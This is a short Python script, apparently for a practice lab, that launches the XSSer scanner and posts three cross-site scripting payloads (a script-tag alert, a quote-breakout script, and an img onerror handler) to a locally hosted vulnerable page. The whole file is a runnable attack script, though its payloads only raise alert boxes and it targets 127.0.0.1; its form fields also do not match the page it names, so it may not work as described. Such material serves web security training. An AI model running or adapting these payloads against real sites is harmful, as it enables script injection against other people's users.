# Cross-Site Scripting (XSS)
# XSSER
# Description: This Python class provides methods to demonstrate Cross-Site Scripting (XSS) attacks using the tool XSSER. The primary target is a vulnerable application at http://127.0.0.1/vulnerabilities/xss_d/. The implementation leverages the requests.Session object to maintain the session state.

import requests
import subprocess

class XSSAttack:
    def __init__(self):
        self.base_url = 'http://127.0.0.1/vulnerabilities/xss_d/'

    def start_xsser(self):
        subprocess.run(['xsser', '--default', '--all'])

    def xss_attack_payload_1(self):
        with requests.Session() as s:
            payload = {'txtName': '<script>alert(1)</script>', 'btnSign': 'Submit'}
            response = s.post(self.base_url, data=payload)
            return response.text

    def xss_attack_payload_2(self):
        with requests.Session() as s:
            payload = {'txtName': '\"><script>alert(2)</script>', 'btnSign': 'Submit'}
            response = s.post(self.base_url, data=payload)
            return response.text

    def xss_attack_payload_3(self):
        with requests.Session() as s:
            payload = {'txtName': '<img src=x onerror=alert(3)>', 'btnSign': 'Submit'}
            response = s.post(self.base_url, data=payload)
            return response.text

def main():
    xss = XSSAttack()
    xss.start_xsser()
    result1 = xss.xss_attack_payload_1()
    print(f'Result of XSS payload 1: {result1[:200]}')  # Print first 200 characters for brevity

    result2 = xss.xss_attack_payload_2()
    print(f'Result of XSS payload 2: {result2[:200]}')

    result3 = xss.xss_attack_payload_3()
    print(f'Result of XSS payload 3: {result3[:200]}')

if __name__ == "__main__":
    main()
